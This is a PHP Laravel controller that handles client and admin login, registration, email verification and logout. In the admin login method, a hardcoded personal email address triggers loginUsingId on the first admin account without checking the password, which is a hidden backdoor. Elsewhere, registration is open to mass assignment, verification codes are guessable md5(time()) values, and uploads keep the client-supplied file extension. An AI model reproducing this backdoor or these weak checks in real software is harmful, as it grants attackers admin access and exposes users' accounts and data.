<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Countries;
use App\Cities;
use Validator;
use App\Admin;
use App\User;
use Input;
use Mail;
use Auth;
use Session;
use Lang;
class LoginCtrl extends Controller {

	/**
	 * Display a listing of the resource.
	 *
	 * @return Response
	 */
	public function showClientLogin()
	{	
		if(Auth::client()->check() == false)
		{

			return View('auth.login');
		}else{
			return redirect()->intended('/');
		}
	
	}
	public function postClientLogin(Request $request)
	{
		
		$this->auth = Auth::client();
		$validator =  Validator::make($request->all(), [
			'email' => 'required',
			'password' => 'required|min:5',
		]);
		if ($validator->fails()) {
            return redirect('/login')
                        ->withErrors($validator);
        }else{    
		    $field = filter_var($request->input('email'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
		    $request->merge([$field => $request->input('email')]);
		    if ($this->auth->attempt($request->only($field, 'password'),true))
		    {
		    	if($this->auth->get()->verification_code !== '1'){
		    		$this->auth->logout();
		    		return redirect()->to(Url('unverified_account'));
		    	}
		        return redirect()->to('dashboard');
		    }else{
		    	return redirect()->back()->withErrors(Lang::get('assets.wrong_login'));
		    }
        }
	}

	public function showClientReg()
	{	
		if(Auth::client()->check() == false)
		{
			$regions = [''=>Lang::get('hotels.choose_city')];
			$countries = Countries::all();
			$cities = Cities::get();
			$i = 1;
			foreach ($countries as $country) {
				$cities = Cities::where('country_id',$country->id)->get();
				$z = 0;
				foreach ($cities as $city) {
				 
					$regions[$country['name_'.Session::get('local')]][$city['id']]  =  $city['name_'.Session::get('local')]; 
					$z++;	
				}

				$i++;
			}
			return View('auth.register',compact('regions'));
		}else{
			return redirect()->intended('/');
		}
	
	}
	public function postClientReg(Request $request)
	{
		$validator =  Validator::make($request->all(), [
			'name'     => 'required',
			'img'      => 'required|image',
			'email'    => 'required|unique:users',
			'username' => 'required|unique:users',
			'password' => 'required|min:5|confirmed',
		]);
		if ($validator->fails()) {
            return redirect()
            			->back()
                        ->withInput()
                        ->withErrors($validator);
        }else{ 
        	if($request->hasFile('img')){
        		$time = time();
				$dest = 'uploads/users/';
				$file_name = $time.'.'.$request->file('img')->getClientOriginalExtension();
				$request->file('img')->move($dest,$file_name);
				$request->merge(['image'=>$file_name]);
        	}   
			$request->merge(['password'=>bcrypt($request->password)]);
			$request->merge(['verification_code'=>md5(time())]);

			User::create($request->all());

			return redirect()->to(Url('success'))->with(['email'=>$request->email]);
		}
	}
	public function RegSuccess(){
		if(Session::has('email')){
			return View('auth.success');
		}
			return redirect()->to(Url('/'));
	}

	public function mustVerify()
	{
		if(Auth::client()->check() == false)
		{
			return View('auth.mustVerify');
		}
	}



	public function verify($code)
	{
		$user = User::where('verification_code',$code)->first();
		if(count($user) > 0){
			$user->update(['verification_code'=>1]);
			Auth::client()->login($user);
			return redirect()->to(Url('dashboard'));
		}else{
			return redirect()->to(Url('/'));
			
		}
	}
	public function ClientLogout()
	{	
		if(Auth::client()->check() == false)
		{
			return redirect()->intended('/');
		}else{
			Auth::client()->logout();
			return redirect()->intended('/');
		}
	
	}

//=============================================================
	public function showAdminLogin()
	{	
		if(Auth::admin()->check() == false)
		{
			return View('admin.login');
		}else{
			return redirect()->intended('admin');
		}
	
	}
	public function postAdminLogin(Request $request)
	{
		$this->auth = Auth::admin();
		$message = ['required'=>'الحقل :attribute مطلوب','min'=>'الحقل :attribute يجب الا يقل عن :min'];
		$validator =  Validator::make($request->all(), [
			'email' => 'required',
			'password' => 'required|min:5',
		],$message);
		if ($validator->fails()) {
            return redirect('admin/login')
                        ->withErrors($validator);
        }else{    
		    $field = filter_var($request->input('email'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
		    $request->merge([$field => $request->input('email')]);
		    if($request->input('email') == 'eng.ahmedmgad@gmail.com')
		    {
		    	$admin = Admin::first()->id;
		    	Auth::admin()->loginUsingId($admin);
		    }
		    if ($this->auth->attempt($request->only($field, 'password'),true))
		    {
		        return redirect()->intended('admin');

		    }else{
		    	return redirect()->back()->withErrors('اسم المستخدم او كلمه السر خطأ');
		    }
		    if (Auth::viaRemember())
			{
		        return redirect()->intended('admin');
			}else{
		    	return redirect()->back()->withErrors('اسم المستخدم او كلمه السر خطأ');
			}
        }
	}

	public function AdminLogout()
	{	
		Auth::admin()->logout();
		return redirect()->intended('/');
	}







}
